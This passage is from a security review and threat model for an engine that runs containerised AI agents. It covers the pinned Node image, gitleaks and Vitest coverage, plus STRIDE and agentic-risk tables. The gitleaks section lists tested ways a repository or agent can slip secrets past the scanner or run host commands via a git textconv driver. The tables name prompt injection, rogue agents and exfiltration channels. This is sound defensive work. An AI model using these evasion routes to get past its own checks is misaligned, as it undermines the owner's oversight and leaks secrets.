| Install scripts | Not applicable. The image's `docker-entrypoint.sh` runs at start; the agent image should set its own entrypoint. |
| Permissions it needs | Defaults to **root** (no `USER` set). It has a `node` user (uid and gid 1000), which the agent image must use, with the Role policy's runtime limits. On Linux, uid 1000 often equals the owner's uid, which is harmless while nothing else of the owner's is mounted. |
| What it pulls in | Four layers, about 86 MB compressed (amd64): Debian trixie slim, the `node` user, Node 26.13.0 with npm, and the entrypoint. No yarn. |
| Verdict | **Approve, with conditions:** pinned by index digest, a Debian CVE scan passed before first use and in CI (#18), npm left out of the final stage, `USER node`, and a scheduled digest bump (the pin freezes Debian security updates, so it needs a regular refresh, for example weekly or on each Debian security advisory). |
| Proposed pin | **`node:26.13.0-trixie-slim@sha256:5adad64f9a1fca2d51972caa65983634c8a774eb300d72b20f7f2a0f60368072`**, the multi-arch index digest, confirmed against the registry's `Docker-Content-Digest`. It covers amd64, arm64, ppc64le and s390x. |

**Also used, already reviewed:** Vitest. The extension pins `vitest@5.1.0`,
and its whole lockfile (102 packages) has no npm advisories. The engine
should pin the same version and never run Vitest's UI or API server.

### 5. gitleaks (the engine's secrets scanner, OQ-11)

Checked on 2026-11-11 for spec v18 (OQ-11, SR-19). **Sources that worked:**
GitHub release downloads (archives and `checksums.txt`),
`raw.githubusercontent.com` (README, `SECURITY.md`, `go.mod` on `master`),
the Go module proxy and checksum database, Docker Hub, and the OSV bulk
exports for the Go and GIT ecosystems (`osv-vulnerabilities` bucket, dated
2026-11-10). **Lookups that failed:** the GitHub API and web pages (release
metadata, repository advisories, contributors; refused, because this session
is bound to its own repositories), `api.osv.dev`, `vuln.go.dev` and NVD
(refused by the proxy). So **who published the release, and when, is not
verified**, and only advisories that reached OSV are counted. Unlike the
reviews above, this component **was run**, in this session's sandbox, to
test the suppression paths below. CVE reachability came from `govulncheck`
1.9.0 against a local copy of the OSV Go data.

| Item | Finding |
|---|---|
| Source and maintainers | `github.com/gitleaks/gitleaks`, Go module `github.com/zricethezav/gitleaks/v8`, MIT license (Zachary Rice). **One maintainer in practice.** The README on `master` says gitleaks is "feature complete", that future releases will be "security patches only", and that he has moved to Betterleaks. The latest release is **8.30.1**: tag `8d1f98c7` dated 2026-02-21, archives dated 2026-03-21. There has been no release since, although `master` has commits up to 2026-10-23. **The release binaries are built on the maintainer's Mac, not in CI.** They embed `/Users/zrice/...` paths. The release workflow only builds the Docker image. There are no signatures, provenance or SBOM. `checksums.txt` sits beside the archives, so it proves integrity, not origin. **Mitigation found:** I rebuilt the source at the tag, verified against the Go checksum database, with Go 1.24.11 and the release's flags. The linux x64 and arm64, darwin x64, and windows x64 and arm64 binaries came out **bit-for-bit identical**. darwin arm64 is built with cgo and couldn't be reproduced here. |
| Known CVEs | **gitleaks itself (OSV GIT data):** CVE-2026-63728 (secret exfiltration through Sprig functions in `--report-template`) is fixed in 8.30.1. **CVE-2026-124039 (published 2026-11-06) is unfixed through 8.30.1.** It writes the `--report-path` file with default permissions, so other local users can read unredacted secrets. It is avoided by reporting to stdout with `--redact`. **Compiled-in code:** the binary has Go 1.24.11 (a line that is no longer supported; Go 1.26.11 is current) and old modules. `govulncheck` finds 72 advisories by symbol in binary mode: 46 stdlib, 20 `golang.org/x/crypto`, and the rest in `klauspost/compress`, `andybalholm/brotli`, `nwaples/rardecode` and `golang.org/x/text`. In source mode, 29 are reachable by its call graph. Each reachable trace runs through one of four paths: the `--diagnostics=http` pprof server, archive extraction (`--max-archive-depth` > 0), git mode (`git log` parsing, remote URL), or a call-graph over-approximation through `signal.Notify` and `re2.init`. **The invocation below uses none of the first three.** `x/crypto/ssh` is linked in but not called. **Upstream fix: none.** `master` still pins Go 1.24.11 and `x/crypto` 0.35.0. |
| Install | Use the official release archive, with its SHA-256 pinned in the engine (below). Check it before extracting, extract only the `gitleaks` binary into an engine-owned folder, check the binary's SHA-256 too, and check that `gitleaks version` prints `8.30.1`. No install scripts. **Not `go install`:** it builds on the owner's machine with whatever toolchain is local and resolves the module at install time. Also not Homebrew, Scoop or the Docker image (`zricethezav/gitleaks:v8.30.1` is index `sha256:c00b6bd0…bbb7f`, which isn't needed for host scanning), and not the pre-commit hook or `gitleaks-action`. |
| Permissions it needs | **No network** for `dir` or `stdin` scans. It ran clean in an empty network namespace. `strace` shows no sockets and only the `--config` file opened. It reads files under its source path and needs no privilege. **Inputs a scanned repo can control, all confirmed by test:** (a) `{source}/.gitleaks.toml` replaces the rules unless `--config` is given. (b) **`{source}/.gitleaksignore` is always loaded, and no flag turns it off.** `--gitleaks-ignore-path` only adds a second file. In `stdin` mode `{source}` is the working directory. (c) An inline `gitleaks:allow` on the line suppresses a finding unless `--ignore-gitleaks-allow` is given. (d) The default config's path allowlist skips any path containing `gitleaks.toml`, images, `.pdf`, lockfiles, `node_modules/`, `vendor/` and more, so an agent can hide a secret through a file's name. (e) **Git mode (`gitleaks git`, `detect`, `protect`) runs `git log -p` in the repo.** The repo's `.git/config` textconv driver plus `.gitattributes` ran a command on the host, and `-diff` hid the content. Both secrets were missed. (f) The `GITLEAKS_CONFIG` and `GITLEAKS_CONFIG_TOML` environment variables are read when `--config` is absent. |
| What it pulls in | One static binary (CGO off, except darwin arm64), about 22 MB. It needs `git` only in git mode, which the engine must not use. 65 third-party Go modules are compiled in: cobra and viper (CLI and config), Sprig (report templates), `wasilibs/go-re2` running RE2 as WebAssembly in `tetratelabs/wazero` (no disk cache), and `mholt/archives` with 7z, rar, xz, brotli, zstd and lz4 decoders (archive scanning, off at depth 0). |
| Verdict | **Approve, with conditions:** (1) The engine never runs git mode. It reads each blob of the commit itself with `git cat-file blob <sha>`, which applies no textconv or attributes, and writes it to a fresh engine-owned 0700 staging folder outside every repo. Each blob is a regular file named by its blob SHA, so no path allowlist or `.gitleaksignore` can match. The engine maps findings back to paths itself. (2) The exact invocation below, by absolute path, with an argument array, no shell, the working folder set to an engine-owned empty folder, and the two `GITLEAKS_*` variables cleared. (3) Exit 0 means clean, exit 99 means findings (block the commit), and **any other exit (1 = error, 126 = bad flag, timeout) means fail closed** (SR-2). (4) The rules file is engine-owned factory configuration, change-controlled, outside every repo. Any allowlist (for example for lockfile false positives) needs owner approval. (5) The OSV-Scanner run in CI (SR-19) will flag the 72 compiled-in advisories. Record them as not in the used code path with this triage, and re-review when a gitleaks release or advisory appears. (6) **Residual risk for the owner to note:** the tool is in security-patch-only mode with a single maintainer, has not released a fix for a CVE five days old, and ships on an unsupported Go line. If that continues, revisit OQ-11 (for example by building from a pinned tag with a current Go, or a replacement). Approval doesn't depend on it. |
| Proposed pin | **gitleaks 8.30.1** (tag commit `8d1f98c7967eb1e79cb44ac6241a124e145d2165`, Go sum `h1:PmEvCfVI7ti9dV3s5aMZUY7sS2GxRvG3yzih7E+cS3w=`). Archive SHA-256 values, all checked against downloads and `checksums.txt`: linux_x64 `551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb`, linux_arm64 `e4a487ee7ccd7d3a7f7ec08657610aa3606637dab924210b3aee62570fb4b080`, darwin_x64 `dfe101a4db2255fc85120ac7f3d25e4342c3c20cf749f2c20a18081af1952709`, darwin_arm64 `b40ab0ae55c505963e365f271a8d3846efbc170aa17f2607f13df610a9aeb6a5` (not reproduced), windows_x64 `d29144deff3a68aa93ced33dddf84b7fdc26070add4aa0f4513094c8332afc4e`, windows_arm64 `b95f5e4f5c425cedca7ee203d9afd29597e692c4924a12ed42f970537c72cc0f`. Binary SHA-256 values: linux_x64 `88f91962aa2f93ac6ab281d553b9e125f5197bbbce38f9f2437f7299c32e5509`, linux_arm64 `00e91bbe655bd7c47753e8cfe61cb76ea1a5d7e7702fe161ee40102b46b3823b`, darwin_x64 `cee01fea7173f1b779dff188e1c26ecbcb4027d394acc573b23aaf0be260e291`, darwin_arm64 `ba52fb1bfabbcde42f032afad3d6e0b19dff8ed105229a16e7caa338bbc0e84f`, windows_x64 `17157e2ee8b76fc8b1d8bee607a250e34b8a8023c8bc81822d4b5ee4d78fcb7c`, windows_arm64 `200df852fdecbedb19a33960657333cba5e231740bc8968972b507b50f93b194`. |

**Required invocation** (each flag tested against 8.30.1):

```
<abs path>/gitleaks dir <staging dir>
  --config <engine-owned rules file>      # skips {source}/.gitleaks.toml and the env vars
  --gitleaks-ignore-path <empty engine-owned dir>
  --ignore-gitleaks-allow                 # inline gitleaks:allow no longer suppresses
  --max-archive-depth 0                   # no archive decoders
  --redact --report-format json --report-path -   # no report file (CVE-2026-124039), no secret in output
  --exit-code 99 --no-banner --no-color --log-level error
  --timeout <seconds>
```

The rules file holds only `[extend]` and `useDefault = true`, so the rules
are the defaults built into the pinned binary. Never pass `--baseline-path`,
`--enable-rule`, `--diagnostics`, `--report-template`, `--follow-symlinks` or
`--log-opts`. `stdin` mode is also safe with the same flags, but only when the
working folder is an empty engine-owned folder, because it loads
`./.gitleaksignore`.

### 6. `@vitest/coverage-v8` (test coverage, dev only)

- **Pin:** 5.1.0 exact, matching Vitest 5.1.0 (its peer dependency requires the
  same version). Published 2026-11-02 with npm provenance (SLSA v1) and a
  registry signature. Integrity
  `sha512-OY9aShBQG5KOIw2zCo9fDoCHI9RHliNHJ//nM7m6jGg41Hyke9JOGWmeMlK74xYErsxMoK8mIB3gAeEyFVA7LA==`.
- **What it adds:** 12 packages, all MIT, none with install scripts:
  the plugin, `@bcoe/v8-coverage`, `ast-v8-to-istanbul`, `@vitest/istanbul-lib-coverage`,
  `@vitest/istanbul-lib-report`, `magicast`, `tinyrainbow`, `js-tokens` and four
  `@babel/*` parser packages. `npm audit` finds no known vulnerabilities.
- **Exposure:** a dev dependency. It runs only in tests and CI, reads V8's own
  coverage data, and is never in the engine bundle or any image.
- **Verdict:** acceptable at Rapid prototype. No findings. Install with
  `npm ci --ignore-scripts` as for the other dev dependencies.

## Threat model (S9.7)

**System:** the owner's Claude Code session (skill and client) talks to the
engine over the local channel. The engine (host, owner's user) holds the
secrets, reads manifests, talks to GitHub, drives Docker, runs the proxy and
commits to Git. Agent containers (analyst, web reader) talk only to the
proxy, and to the engine through the SDK's stdio stream. Outside: GitHub,
the Anthropic API, and the open web.

**Trust boundaries:** owner ↔ engine (channel, device approval); engine ↔
container (stdio stream, `factory` tools, worktree mount); container ↔
outside (proxy); engine ↔ GitHub; engine ↔ local config (manifest, path
list, credential store).

### STRIDE

| Threat | Example in F-007 | Covered by |
|---|---|---|
| **Spoofing** | A local process connects to the channel as the owner's client | Channel v1.3 peer checks; #13 |
| | Someone else approves the device sign-in, or the owner id is swapped in the manifest | FR-7, ADR 0014; #7, #23 |
| | The analyst uses the web reader's network identity at the proxy | #2 |
| | A remote Docker daemon poses as the local one | #14 |
| **Tampering** | Forged `approve_assumption` on `factory/state` | #12 |
| | Agent writes outside its rules, or into git hooks the engine runs | FR-9; #6 |
| | Repo settings change the agent's tools or instructions | #5 |
| | A new path in the project list, or an edited manifest | #7, #9 |
| **Repudiation** | No record of what the reader fetched or which session made a connection | SR-4; proxy log per #2; WebSearch queries from the SDK stream (#20) |
| | Engine actions without an approval id | SR-4, S9.6 |
| **Information disclosure** | Model credential read inside the container, or data sent to another account's key | #4 |
| | Internal network pages through SSRF | #3 |
| | Host files through symlinks | #8 |
| | Owner answers in a public repo, session files, logs | #15 |
| | Tracking images in rendered Markdown | #21 |
| | Same-user programs reading the credential store | #19 |
| **Denial of service** | Runaway sessions, research floods, resume loops, container resource use | #10, #17 |
| | GitHub unreachable during approval | Fails closed (ADR 0014); accepted availability cost |
| **Elevation of privilege** | Container reaches host services or Docker's API | #1 |
| | Host code execution through git hooks | #6 |
| | Agent runs on the host through the SDK's default spawn | #5 |
| | FFI bug accepts any peer | #13 |
| | Docker group root on Linux | #14 |

### OWASP Top 10 for Agentic Applications

| Risk | Where it applies | Covered by |
|---|---|---|
| ASI01 Agent goal hijack (prompt injection) | Web pages to reader, reader summary to analyst, repo text to analyst | F-005 SR-6, SR-17; SR-3; #5 (no repo settings or `CLAUDE.md` as instructions); #20 (stripping) |
| ASI02 Tool misuse | `research_web` as an exfiltration or flood channel; `spec_path` as a read primitive | #10, #8; F-005 SR-6 accepted risk (search wording) |
| ASI03 Identity and privilege abuse | Agents acting as the owner; owner credentials in agent reach; factory token in containers | ADR 0014, 0015; #4, #6 (no owner git credentials), #7, #16 |
| ASI04 Agentic supply chain | koffi, the SDK, Claude Code, the base image, repo-supplied MCP servers and skills | S4.1 reviews above; #5, #18, #22 |
| ASI05 Unexpected code execution | Repo hooks in the agent; git hooks on the host; koffi's source build | #5, #6, #22 |
| ASI06 Memory and context poisoning | Resumed session files, transcript summaries on resume, forged transcript entries | #12, #15 (per-session volume) |
| ASI07 Insecure inter-agent communication | Analyst ↔ reader through the engine; owner reply frame | H-0082 (structured tools); #10 (frame); #2 (separate network identities) |
| ASI08 Cascading failures | Crash-resume loops; one project's fault stopping others | #17; FR-2 (a refusal stops only that project); #11 |
| ASI09 Human-agent trust exploitation | Approval fatigue from floods of assumptions; device-code confusion | #10 caps; ADR 0014 code comparison |
| ASI10 Rogue agents | An agent acting outside its role, or persisting across sessions | Container per session, end-of-session check (FR-8, FR-9); #17 caps; #15 session volumes deleted |
